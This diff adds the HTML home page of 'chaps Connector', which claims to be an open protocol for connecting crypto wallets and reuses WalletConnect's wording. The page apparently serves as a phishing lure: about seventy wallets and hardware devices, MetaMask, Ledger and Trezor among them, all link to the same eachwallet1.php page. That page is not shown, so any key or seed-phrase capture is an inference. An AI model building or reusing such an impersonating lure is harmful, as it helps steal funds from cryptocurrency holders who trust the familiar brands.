@@ -1,0 +1,662 @@
+ <!--<?php 
+  session_start(); 
+
+  if (!isset($_SESSION['username'])) {
+  	$_SESSION['msg'] = "You must log in first";
+  	header('location: login.php');
+  }
+  if (isset($_GET['logout'])) {
+  	session_destroy();
+  	unset($_SESSION['username']);
+  	header("location: login.php");
+  }
+?>-->
+<!DOCTYPE html>
+<html  >
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Mobirise v5.5.2, mobirise.com">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+  <link rel="shortcut icon" href="assets/images/logo.png" type="image/x-icon">
+  <meta name="description" content="">
+  
+  
+  <title>Home</title>
+  <link rel="stylesheet" href="assets/web/assets/mobirise-icons2/mobirise2.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
+  <link rel="stylesheet" href="assets/dropdown/css/style.css">
+  <link rel="stylesheet" href="assets/socicon/css/styles.css">
+  <link rel="stylesheet" href="assets/theme/css/style.css">
+  <link rel="stylesheet" href="main.css" type="text/css"> 
+  <link rel="preload" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=swap"></noscript>
+  <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css"><link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css" type="text/css">
+  
+  
+  <style>
+    .apps {
+     width: 95px;
+     height: auto;
+     padding: 10px;
+     text-align: left;
+     margin: auto;
+     justify-content: center;
+     border: none;
+     border-radius: 10px;
+     box-shadow: 2px 2px 10px 2px #ccc;
+     font-weight: 700;
+     font-size: 60%;
+     text-align: center;
+ }
+ 
+ .apps a {
+     text-align: left;
+ }
+ 
+ .apps img {
+     max-width: 75px;
+     border-radius: 50%;
+     object-fit: cover;
+     margin-bottom: 3px;
+ }
+     .btn {
+   background-color: #456c9e; 
+   border: none;
+   color: white;
+   padding: 15px 32px;
+   text-align: center;
+   text-decoration: none;
+   display: inline-block;
+   font-size: 16px;
+   
+ }
+ 
+  
+ .all {
+     display: grid;
+     grid-template-columns: repeat(auto-fit, minmax(90px, 1fr));
+     grid-gap: 10px;
+ }
+ .show {
+     width: auto;
+     height: auto;
+     border: none;
+     border-radius: 5px;
+     font-weight: 700;
+     display: block;
+     padding: 10px;
+ }
+ 
+ .hidden {
+     display: none;
+ }
+ 
+    </style>
+    <script>
+    function show() {
+    var x = document.getElementById("hidden");
+    if (x.style.display === "block") {
+      x.style.display = "none";
+    } else {
+      x.style.display = "block";
+    }
+  
+    if (x.style.display === "block") {
+      document.getElementById("btn").innerHTML = "Show Less &uarr;";
+    } 
+  }
+
+</script>
+  
+  
+  
+</head>
+
+
+
+
+<body>
+  
+  <section data-bs-version="5.1" class="menu cid-s48OLK6784" once="menu" id="menu1-h">
+    
+    <nav class="navbar navbar-dropdown navbar-fixed-top navbar-expand-lg">
+        <div class="container">
+            <div class="navbar-brand">
+                
+                <span class="navbar-caption-wrap"><a class="navbar-caption text-black text-primary display-7" href="index.html"><p> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAAArCAYAAADMr156AAAC+klEQVRoBe2YsW4UMRBA81/0pIcPyAckfX6ADwglEhEVRXSpTgpKhyigCg0VoUlFqlTXRdo7R+/uBnyj9e3YHhMheaSVd/dmx+PnmbF9B6HLmsBB57Ah0EFsI6GDeE4Qi8cQPt2uwttvy3Ay31yvPw7hxbshHH4Y/rx783m51rtftE/gfxYRDP7ixyocXW4GzKBzLr4DXCsozUEA4PxmtZ7pnIHv0yVSvIE0BeENQMMBCKA9pAkInCtNAT3YqWdqy6+HehTuIL7/9k2DKRD8ToG9+rmqouEKAmcsjsc6x/MhnF4vw/ubvxchz/tYz3JPMS0VNxBf7uwQGCj6lvxGD30LCHRYmUrEDQQOTDnLzJdWe76zAHl2EMxCytGXDjkss0xhxN4YdPovFbeIEAc0jFdOVV3s065XpdkujLOv5RCw6Q4CoxQ+ZuxoNpjqQDxI6z0wSDX6qV0xmoHAsLUYWgee0vPYQxSBIPRZtxmopzCr2K1ZAsf8ARSbLg53+1aprNTQ+e8Rkjiv9x81RS+GAQTgSmFlt5uCYQahIYjxWhgagtithaEhiN0UDBMIwkoMjbWlMKb2HqUwUhDEd2BoMYFgCRQjqTYXRirCtP1cGNSuOB20PZ7Zh+gUMYGAcGoTE3dkhWGFILbR147rGeU5lWZiRyAwHi0mEHzEFpd9QWx07J7/IPZJLgTpI5Xb0lcNBGyYQaDMrFhgpMK5FMIUjFoI2SBqYFggWNJPR4YHhCIQuTCIIgsEtstWXYHhBaEYRA6MqQpO2OtUsoCTv/8lbcZa0th67M+qEQCIxVozxpyUdxqC2JeDm+jltrkHvioQOG0N57GBpCAIDEvoj9nNhUB/1SDEaUs4x05PQRC7uTBKILiCwJgVhhVCLoxSCO4gLDDI/RKZiowaCE1A7IPBYGokBYMIo1bViFuN0E7oNKmFIPY5VMUbr9w0Ezu6bQaCjjhm47QXBHFeDoFeELDbFIQ4/j+0HcR2ljqIDmI3YXtE9IjoEbFLYPv0BCuWGXcza0BFAAAAAElFTkSuQmCC" data-filename="image.png" style="width: 100%;"><strong>&nbsp; &nbsp;chaps&nbsp; </strong>&nbsp;<br></p></a></span>
+            </div>           
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-bs-toggle="collapse" data-target="#navbarSupportedContent" data-bs-target="#navbarSupportedContent" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+                <div class="hamburger">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                    <span></span>
+              </div>
+              </button>
+            <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                <ul class="navbar-nav nav-dropdown nav-right" data-app-modern-menu="true"><li class="nav-item"><a class="nav-link link text-black display-4" href="docs.html">Docs</a></li><li class="nav-item"><a class="nav-link link text-black text-primary display-4" href="index.html#content1-d">Wallets</a></li></ul>
+                
+                
+            </div>
+        </div>
+    </nav>
+
+</section>
+
+<section data-bs-version="5.1" class="header1 cid-s48MCQYojq mbr-fullscreen" id="header1-f">
+
+    
+
+    <div class="mbr-overlay" style="opacity: 0.8; background-color: rgb(255, 255, 255);"></div>
+
+    <div class="align-center container">
+        <div class="row justify-content-center">
+            <div class="col-12 col-lg-8">
+                <h1 class="mbr-section-title mbr-fonts-style mb-3 display-5"><strong>CHAPPS CONNECTOR</strong></h1>
+                
+                <p class="mbr-text mbr-fonts-style display-7"><strong>Open protocol for connecting Wallets.</strong></p>
+               <!-- <div class="mbr-section-btn mt-3"><a class="btn btn-success display-4" href="reg.php">Get started</a>
+                     </div>-->
+            </div>
+        </div>
+    </div>
+</section>
+
+<section data-bs-version="5.1" class="image3 cid-s48upRUlSD" id="image3-9">
+    
+
+    
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-12 col-lg-9">
+                <div class="image-wrapper">
+                    <img src="assets/images/banner-1646x472.jpg" alt="connector">
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section data-bs-version="5.1" class="features17 cid-sPg3XSlCuR" id="features18-r">
+
+    
+
+    
+    <div class="container">
+        
+        <div class="row mt-4">
+            <div class="col-12 col-md-6 col-lg-3">
+                <div class="card-wrapper mb-4">
+                    <div class="card-box align-left">
+                        
+                        <p class="mbr-text mbr-fonts-style mb-3 display-7"><strong>WHAT IS CHAPS CONNECTOR</strong><br><strong>(QR Codes &amp; Deep Links)<br></strong>chaps connector is an open source protocol for connecting decentralised applications to mobile wallets with QR code scanning or deep linking.<br><br></p><div class="link-wrap">
+                                
+                            </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-12 col-md-6 col-lg-3">
+                <div class="card-wrapper mb-4">
+                    <div class="card-box align-left">
+                        
+                        <p class="mbr-text mbr-fonts-style mb-3 display-7"><strong>HOW IT WORKS</strong><br>chaps Connectives connects web applications to supported mobile wallets. chapsConnector session is started by a scanning a QR code (desktop) or by clicking an application deep link (mobile).
+                            </p><div class="link-wrap">
+                                
+                            </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-12 col-md-6 col-lg-3">
+                <div class="card-wrapper mb-4">
+                    <div class="card-box align-left">
+                        
+                        <p class="mbr-text mbr-fonts-style mb-3 display-7"><strong>PROTOCOL</strong><br>chaps Connect is not an app, but an open protocol to communicate securely between Wallets and Dapps (Web3 Apps).<br>The connection is initiated by one peer displaying a QR Code or deep link with a standard WalletConnect URI and is established when the counter-party approves this connection request.<br></p><div class="link-wrap">
+                                
+                            </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-12 col-md-6 col-lg-3">
+                <div class="card-wrapper mb-4">
+                    <div class="card-box align-left">
+                        
+                        <p class="mbr-text mbr-fonts-style mb-3 display-7"><strong>SECURE ENCRYPTION</strong><br>The protocol establishes a remote connection between two apps and/or devices. These payloads are symmetrically encrypted through a shared key between the two peers.</p><div class="link-wrap">
+                                
+                            </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section data-bs-version="5.1" class="content1 cid-s48vrXhP0J" id="content1-d">
+    
+    <div class="container-fluid">
+        <div class="row justify-content-center">
+            <div class="title col-12 col-md-9">
+                <h3 class="mbr-section-title mbr-fonts-style align-center mb-4 display-5"><strong>Wallets</strong></h3>
+                <h4 class="mbr-section-subtitle align-center mbr-fonts-style mb-4 display-4">Multiple iOS and Android wallets support the Connector protocol. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.<br><div><br><strong>&nbsp;</strong></div><div><br></div><div>
+
+<div class="all">
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/metamask.png"></a><br>
+        MetaMask
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/MEW.png"></a><br>
+        MEW Wallet
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/trustwallet.png"></a><br>
+        Trust Wallet
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/logo.svg"></a><br>
+        Wallect<br>Connect
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/coinbase.jpg"></a><br>
+        Coinbase Wallet 
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/atomic.png"></a><br>
+        Atomic Wallet
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/binance.png"></a><br>
+        Binance Smart Chain
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/bnb.png"></a><br>
+        BNB
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/Ronin.jpg"></a><br>
+        Ronin 
+    </div>     
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/aurowallet.png"></a><br>
+        AuroWallet 
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/token.png"></a><br>
+        TokenPocket 
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/Solana.jpg"></a><br>
+        Solana
+    </div>
+    
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/polkadot.png"></a><br>
+        Polkadot
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/xrp.png"></a><br>
+        XRP
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/stellar.png"></a><br>
+        Stellar
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/tezos.png"></a><br>
+        Tezos
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/theta.png"></a><br>
+        Theta
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/tron.png"></a><br>
+        Tron
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/safe.jpg"></a><br>
+        Safepal
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/Bybit.jpg"></a><br>
+        Bybit
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/cosmos.png"></a><br>
+        Cosmos
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/kava.png"></a><br>
+        Kava
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/filecoin.png"></a><br>
+        Filecoin
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/jaxx liberty.png"></a><br>
+        Jaxx liberty
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/ledger.png"></a><br>
+        Ledger
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/ethereum-classic.png"></a><br>
+        Ethereum Classic
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/zilliqa.png"></a><br>
+        Zilliqa
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/elrond.jpg"></a><br>
+        Elrond
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/waves.png"></a><br>
+        Waves
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/icon.png"></a><br>
+        ICON
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/ontology.png"></a><br>
+        Ontology
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/oxen.png"></a><br>
+        Oxen Wallet
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/nano.png"></a><br>
+        Nano
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/tomo.png"></a><br>
+        Tomo Chain
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/vechain.jpg"></a><br>
+        VeChain
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/iotex.png"></a><br>
+        IoTex
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/wanchain.png"></a><br>
+        Wanchain
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/harmony.png"></a><br>
+        Harmony
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/kin.png"></a><br>
+        Kin
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/nimiq.png"></a><br>
+        Nimiq
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/aion.png"></a><br>
+        Aion
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/thundertoken.png"></a><br>
+        Thunder Token
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/aeternity.png"></a><br>
+        Aeternity
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/nebulas.png"></a><br>
+        Nebulas
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/fio.png"></a><br>
+        FIO
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/gochain.png"></a><br>
+        GoChain
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/poa.png"></a><br>
+        POA Network
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/callisto.png"></a><br>
+        Callisto
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/bitpay.jpg"></a><br>
+        BitPay
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/aktionariat.png"></a><br>
+        Aktionariat
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/atwallet.png"></a><br>
+        AtWallet
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/guard.png"></a><br>
+        Guard Wallet
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/aave.jpg"></a><br>
+        AAVE
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/exodus.jpg"></a><br>
+        Exodus
+    </div>
+    
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/enjin.jpg"></a><br>
+        Enjin
+    </div>
+    
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/skale.png"></a><br>
+        Skale
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/portis.png"></a><br>
+        Portis
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/trezor.png"></a><br>
+        Trezor
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/squarelink.png"></a><br>
+        Squarelink
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/torus.jpg"></a><br>
+        Torus
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/scatter.jpg"></a><br>
+        Scatter Wallet
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/sumcoin.html"></a><br>
+        Sumcoin
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/math-wallet.png"></a><br>
+        Math Wallet
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/fortmatic.png"></a><br>
+        FortMatic
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/digitex.png"></a><br>
+        Digitex
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/defiat.jpg"></a><br>
+        Defiat
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/authereum.png"></a><br>
+        Authereum
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/flare.jpg"></a><br>
+        Flare Wallet
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/zelcore.png"></a><br>
+        Zelcore
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/bitkeep.png"></a><br>
+        BitKeep
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/coin98.png"></a><br>
+        Coin98
+    </div>
+    
+    <div class="apps">
+        <a href="eachwallet1.php"><img src="images/trustvault.png"></a><br>
+        Trust Vault
+    
+    </div>
+</h4>
+            </div>
+        </div>
+    </div>
+</div>
+</section>
+
+<section data-bs-version="5.1" class="footer3 cid-s48P1Icc8J" once="footers" id="footer3-i">
+
+    
+
+    
+
+    <div class="container">
+        <div class="media-container-row align-center mbr-white">
+          
+            <div class="row social-row">
+                <div class="social-list align-right pb-2">
+                    
+                    
+                    
+                    
+                    
+                    
+                <div class="soc-item">
+                        <a href="https://twitter.com/chapsconnector" target="_blank">
+                            <span class="socicon-twitter socicon mbr-iconfont mbr-iconfont-social"></span>
+                        </a>
+                    </div><div class="soc-item">
+                        <a href="https://www.facebook.com/pages/chapsconnector" target="_blank">
+                            <span class="socicon-facebook socicon mbr-iconfont mbr-iconfont-social"></span>
+                        </a>
+                    </div><div class="soc-item">
+                        <a href="https://www.youtube.com/c/chapsconnector" target="_blank">
+                            <span class="socicon-youtube socicon mbr-iconfont mbr-iconfont-social"></span>
+                        </a>
+                    </div><div class="soc-item">
+                        <a href="https://instagram.com/chapsconnector" target="_blank">
+                            <span class="mbr-iconfont mbr-iconfont-social socicon-instagram socicon"></span>
+                        </a>
+                    </div></div>
+            </div>
+            <div class="row row-copirayt">
+                <p class="mbr-text mb-0 mbr-fonts-style mbr-white align-center display-7">
+                    © Copyright 2021 chaps Connector. All Rights Reserved.
+                </p>
+            </div>
+        </div>
+    </div>
+</section><section style="background-color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif; color:#aaa; font-size:12px; padding: 0; align-items: center; display: flex;"><p style="flex: 0 0 auto; margin:0; padding-right:1rem;"> <a href="https://mobirise.site/f" style="color:#aaa;"></a> </p></section><script src="assets/bootstrap/js/bootstrap.bundle.min.js"></script>  <script src="assets/smoothscroll/smooth-scroll.js"></script>  <script src="assets/ytplayer/index.js"></script>  <script src="assets/dropdown/js/navbar-dropdown.js"></script>  <script src="assets/theme/js/script.js"></script>  
+  
+  
+</body>
+</html>
